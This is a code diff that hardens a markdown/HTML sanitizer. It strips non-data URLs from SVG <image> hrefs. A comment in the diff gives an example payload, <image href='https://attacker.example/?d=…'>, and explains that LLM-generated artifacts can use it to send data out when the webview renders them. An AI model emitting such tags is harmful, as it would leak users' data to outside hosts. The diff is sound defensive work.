@@ -272,7 +272,13 @@ export function sanitizeMarkdownHtml(html: string): string {
       }
     }
 
-    // Validate href attributes to prevent javascript: protocol execution
+    // Validate href attributes to prevent javascript: protocol execution.
+    // SEV-DESK-12: SVG <image> elements receive a stricter rule — they are
+    // a known SSRF / data-exfiltration vector when an LLM-generated artifact
+    // contains <image href="https://attacker.example/?d=…" />. The webview
+    // dereferences the URL at render time. Restrict <image> hrefs to
+    // `data:image/*` only; `<a href="https://…">` keeps its broader allow.
+    const isSvgImage = node.tagName === 'image' || node.tagName === 'IMAGE';
     const hrefAttributes = ['href', 'xlink:href'];
     for (const attr of hrefAttributes) {
       if (node.hasAttribute(attr)) {
@@ -283,6 +289,12 @@ export function sanitizeMarkdownHtml(html: string): string {
             value.startsWith('data:text/html') ||
             value.startsWith('data:application/javascript'))
         ) {
+          node.removeAttribute(attr);
+          continue;
+        }
+        if (isSvgImage && value && !/^data:image\//i.test(value)) {
+          // Strip non-data URLs from <image> — prevents the renderer from
+          // making an outbound request triggered solely by attacker content.
           node.removeAttribute(attr);
         }
       }
